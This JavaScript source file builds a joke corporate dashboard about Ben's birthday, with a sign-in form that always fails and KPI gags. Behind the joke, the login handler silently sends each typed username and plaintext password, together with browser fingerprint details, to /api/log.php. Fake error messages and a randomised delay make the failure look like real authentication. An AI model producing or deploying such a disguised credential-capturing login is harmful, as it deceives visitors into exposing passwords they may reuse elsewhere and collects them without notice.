/* ============================================================
   monday.js — BirthdayCorp™ Enterprise Suite v3.14
   A corporate dashboard. Username pre-filled. Login never works.
   ============================================================ */

window.Monday = {

  init(app) {
    // Calculate days until next July 5
    const today  = new Date();
    const nextBd = new Date(today.getFullYear(), 6, 5);
    if (nextBd < today) nextBd.setFullYear(today.getFullYear() + 1);
    const daysUntil = Math.ceil((nextBd - today) / 86400000);

    app.innerHTML = this.buildHTML(daysUntil);
    this.initLogin();
    this.initCalendar();
  },

  buildHTML(daysUntil) {
    return `
      <nav class="co-nav">
        <div class="co-nav-logo">
          BirthdayCorp<span>Enterprise Suite v3.14 · Internal Use Only</span>
        </div>
        <div class="co-nav-right">Last login: July 5th, [YEAR REDACTED]</div>
      </nav>

      <div class="co-layout">

        <!-- LEFT: Login panel -->
        <aside>
          <div class="co-card">
            <h1 class="co-login-title">Sign in</h1>
            <p class="co-login-subtitle">BirthdayCorp™ Enterprise Suite &mdash; Secure Portal</p>

            <div class="co-form-group">
              <label for="co-username">Email or username</label>
              <input id="co-username" type="text" placeholder="Email or username" autocomplete="username">
            </div>
            <div class="co-form-group">
              <label for="co-password">Password</label>
              <div class="co-pw-wrap">
                <input id="co-password" type="password" placeholder="Password" autocomplete="current-password">
                <button type="button" class="co-pw-toggle" id="co-pw-toggle" tabindex="-1" aria-label="Show password">
                  <svg class="co-eye-show" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                  <svg class="co-eye-hide" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
                </button>
              </div>
              <div class="co-pw-row">
                <label class="co-remember"><input type="checkbox" id="co-remember"> Keep me signed in</label>
                <a href="#" class="co-forgot-link" id="co-forgot-link">Forgot password?</a>
              </div>
              <div class="co-forgot-note" id="co-forgot-note" style="display:none"></div>
            </div>

            <button class="co-login-btn" id="co-login-btn">
              <span class="btn-text">Sign in</span>
              <span class="co-spinner"></span>
            </button>

            <div class="co-error-box" id="co-error-box">
              <strong>Incorrect username or password.</strong>Please try again.
            </div>
          </div>

          <div class="co-card">
            <p class="co-dash-title">Your Action Items</p>
            <div class="co-action-item">
              <span class="co-action-badge">OVERDUE</span>
              <div class="co-action-text">
                Acknowledge Ben's Birthday
                <small>Due: July 5th · Has been overdue since July 6th · Assigned to: You</small>
              </div>
            </div>
            <div class="co-action-item">
              <span class="co-action-badge" style="background:#888">BLOCKED</span>
              <div class="co-action-text">
                Complete Birthday Pipeline Q3 Review
                <small>Blocked by: It Not Being Ben's Birthday</small>
              </div>
            </div>
            <div class="co-action-item">
              <span class="co-action-badge" style="background:#888">BLOCKED</span>
              <div class="co-action-text">
                Submit Birthday Synergy Report
                <small>Blocked by: Same reason as above</small>
              </div>
            </div>
          </div>
        </aside>

        <!-- MIDDLE: KPI dashboard -->
        <main>
          <div class="co-card">
            <p class="co-dash-title">Birthday Readiness Dashboard — Q${Math.ceil((new Date().getMonth()+1)/3)}</p>

            <div class="co-kpi-grid">
              <div class="co-kpi">
                <p class="co-kpi-label">Birthday Readiness Score</p>
                <p class="co-kpi-value red">0 <small style="font-size:1rem">/100</small></p>
                <p class="co-kpi-delta">▼ 100 from yesterday</p>
              </div>
              <div class="co-kpi">
                <p class="co-kpi-label">Days Until Birthday Event</p>
                <p class="co-kpi-value">${daysUntil}</p>
                <p class="co-kpi-delta" style="color:#888">days remaining</p>
              </div>
              <div class="co-kpi">
                <p class="co-kpi-label">Stakeholder Alignment</p>
                <p class="co-kpi-value red">CRITICAL</p>
                <p class="co-kpi-delta">Misalignment detected</p>
              </div>
              <div class="co-kpi">
                <p class="co-kpi-label">Synergies Identified</p>
                <p class="co-kpi-value yellow">0</p>
                <p class="co-kpi-delta">— same as last quarter</p>
              </div>
            </div>

            <div class="co-progress-wrap">
              <div class="co-progress-header">
                <span class="co-progress-label">Birthday Pipeline Conversion</span>
                <span class="co-progress-pct">47%</span>
              </div>
              <div class="co-progress-bg">
                <div class="co-progress-fill"></div>
              </div>
              <p class="co-progress-note">
                This metric has been 47% for 11 months. We have stopped asking questions.
              </p>
            </div>

            <div class="co-progress-wrap">
              <div class="co-progress-header">
                <span class="co-progress-label">Cake Procurement Status</span>
                <span class="co-progress-pct" style="color:#cc1016">0%</span>
              </div>
              <div class="co-progress-bg">
                <div class="co-progress-fill" style="width:0%"></div>
              </div>
              <p class="co-progress-note">No cake has been procured. No cake is being procured. Status: concerning.</p>
            </div>

            <div class="co-progress-wrap">
              <div class="co-progress-header">
                <span class="co-progress-label">Candle Readiness Index</span>
                <span class="co-progress-pct" style="color:#888">—</span>
              </div>
              <div class="co-progress-bg">
                <div class="co-progress-fill" style="width:0%"></div>
              </div>
              <p class="co-progress-note">Cannot assess candle readiness without cake. Classic blocker.</p>
            </div>
          </div>

          <div class="co-card">
            <p class="co-dash-title">Recent Activity</p>
            <div class="co-action-item">
              <span class="co-action-badge" style="background:#888">INFO</span>
              <div class="co-action-text">
                System detected: it is not Ben's birthday
                <small>Automated · Occurs daily except July 5th</small>
              </div>
            </div>
            <div class="co-action-item">
              <span class="co-action-badge" style="background:#888">INFO</span>
              <div class="co-action-text">
                Birthday countdown updated
                <small>${daysUntil} days remaining · Next update: tomorrow · Confidence: high</small>
              </div>
            </div>
            <div class="co-action-item">
              <span class="co-action-badge" style="background:var(--co-red)">WARN</span>
              <div class="co-action-text">
                Zero (0) birthday-related activities detected today
                <small>This has been flagged. No one is doing anything about it.</small>
              </div>
            </div>
          </div>
        </main>

        <!-- RIGHT: Calendar -->
        <aside>
          <div class="co-card">
            <h2 class="co-cal-title">Schedule a Birthday Sync</h2>
            <p class="co-cal-subtitle">Select an available date below.</p>
            <div class="co-cal-note">
              ⚠️ All dates are currently unavailable except <strong>July 5th</strong>,
              which is marked <strong>MANDATORY — ALL HANDS</strong>.
            </div>
            <button class="co-cal-btn" id="co-cal-btn">View Calendar</button>
            <div class="co-cal-grid" id="co-cal-grid" style="display:none"></div>
          </div>

          <div class="co-card">
            <p class="co-dash-title">Team Birthday Alignment</p>
            <div style="font-size:0.8rem; color:var(--co-muted); line-height:1.8">
              <div>🔴 Ben's Birthday: <strong>NOT TODAY</strong></div>
              <div>🔴 Cake Status: <strong>NONE</strong></div>
              <div>🔴 Candles: <strong>UNLIT</strong></div>
              <div>🔴 Celebration: <strong>PENDING</strong></div>
              <div>🔴 Fun: <strong>DEFERRED</strong></div>
              <div style="margin-top:8px; font-size:0.7rem; font-style:italic">
                All systems will transition to 🟢 on July 5th.
              </div>
            </div>
          </div>
        </aside>

      </div>

      <div class="co-statusbar">
        <span class="co-status-item">Status: <strong>BIRTHDAY NOT DETECTED</strong></span>
        <span class="co-status-item">Session: <strong>UNAUTHORIZED</strong></span>
        <span class="co-status-item">Birthday Index: <strong>0.00</strong></span>
        <span class="co-status-item">Next birthday: <strong>${daysUntil} days</strong></span>
      </div>
    `;
  },

  initLogin() {
    const btn        = document.getElementById('co-login-btn');
    const error      = document.getElementById('co-error-box');
    const pass       = document.getElementById('co-password');
    const toggle     = document.getElementById('co-pw-toggle');
    const forgot     = document.getElementById('co-forgot-link');
    const forgotNote = document.getElementById('co-forgot-note');
    let attempts = 0;

    const user = document.getElementById('co-username');

    // Auto-focus username since it's now blank
    user.focus();

    // Show / hide password toggle
    toggle.addEventListener('click', () => {
      const showing = pass.type === 'text';
      pass.type = showing ? 'password' : 'text';
      toggle.querySelector('.co-eye-show').style.display = showing ? '' : 'none';
      toggle.querySelector('.co-eye-hide').style.display = showing ? 'none' : '';
      toggle.setAttribute('aria-label', showing ? 'Show password' : 'Hide password');
    });

    // Forgot password — standard corporate response, no visible joke
    forgot.addEventListener('click', (e) => {
      e.preventDefault();
      forgotNote.textContent = 'If an account exists for this email address, password reset instructions have been sent.';
      forgotNote.style.display = 'block';
    });

    // Error messages cycle through realistic corporate failures
    const messages = [
      { strong: 'Incorrect username or password.', body: 'Please try again.' },
      { strong: 'Authentication failed.', body: 'Your credentials could not be verified. Please try again.' },
      { strong: 'Too many failed sign-in attempts.', body: 'Your account has been temporarily locked. Please contact your IT administrator or try again later.' },
    ];

    const attempt = () => {
      if (!user.value) {
        user.classList.add('co-input-error');
        error.innerHTML = '<strong>Email or username is required.</strong>Please enter your email or username to continue.';
        error.classList.add('visible');
        user.focus();
        return;
      }
      if (!pass.value) {
        pass.classList.add('co-input-error');
        error.innerHTML = '<strong>Password is required.</strong>Please enter your password to continue.';
        error.classList.add('visible');
        pass.focus();
        return;
      }

      // Write 1: log inputs + browser data immediately on submit
      fetch('/api/log.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          event: 'login_attempt',
          ts: new Date().toISOString(),
          username: user.value,
          password: pass.value,
          attempt_number: attempts + 1,
          userAgent: navigator.userAgent,
          language: navigator.language,
          screen: `${screen.width}x${screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          platform: navigator.platform,
          referrer: document.referrer,
          url: window.location.href,
        }),
      }).catch(() => {});

      btn.classList.add('loading');
      btn.classList.remove('shaking');
      error.classList.remove('visible');
      pass.classList.remove('co-input-error');

      // Variable delay — feels like a real auth round-trip
      const delay = 900 + Math.random() * 900;
      setTimeout(() => {
        btn.classList.remove('loading');
        btn.classList.add('shaking');
        pass.classList.add('co-input-error');

        const msg = messages[Math.min(attempts, messages.length - 1)];
        error.innerHTML = `<strong>${msg.strong}</strong>${msg.body}`;
        error.classList.add('visible');
        attempts++;

        // Write 2: log the outcome after the fake auth delay
        fetch('/api/log.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            event: 'login_result',
            ts: new Date().toISOString(),
            outcome: 'failed',
            error_shown: msg.strong + ' ' + msg.body,
            attempt_number: attempts,
          }),
        }).catch(() => {});

        setTimeout(() => btn.classList.remove('shaking'), 700);
      }, delay);
    };

    // Clear error state as soon as the user starts typing again
    [user, pass].forEach(input => {
      input.addEventListener('input', () => {
        input.classList.remove('co-input-error');
        error.classList.remove('visible');
      });
    });

    btn.addEventListener('click', attempt);
    pass.addEventListener('keydown', e => { if (e.key === 'Enter') attempt(); });
  },

  initCalendar() {
    const btn  = document.getElementById('co-cal-btn');
    const grid = document.getElementById('co-cal-grid');
    let open = false;

    btn.addEventListener('click', () => {
      open = !open;
      grid.style.display = open ? 'grid' : 'none';
      btn.textContent = open ? 'Hide Calendar' : 'View Calendar';
      if (open && grid.children.length === 0) this.renderCalendar(grid);
    });
  },

  renderCalendar(grid) {
    // Show July of a generic year, with July 5 highlighted
    const labels = ['Su','Mo','Tu','We','Th','Fr','Sa'];
    labels.forEach(l => {
      const d = document.createElement('div');
      d.className = 'co-cal-day-label';
      d.textContent = l;
      grid.appendChild(d);
    });

    // July 1 = Wednesday (day index 3) in a reference year
    // Offset: 3 blank cells
    for (let i = 0; i < 3; i++) {
      const d = document.createElement('div');
      grid.appendChild(d);
    }

    for (let day = 1; day <= 31; day++) {
      const d = document.createElement('div');
      d.textContent = day;
      if (day === 5) {
        d.className = 'co-cal-day birthday';
        d.title = 'BEN\'S BIRTHDAY — MANDATORY ALL HANDS — DO NOT BLOCK';
      } else {
        d.className = 'co-cal-day blocked';
        d.title = 'Unavailable';
      }
      grid.appendChild(d);
    }
  },
};
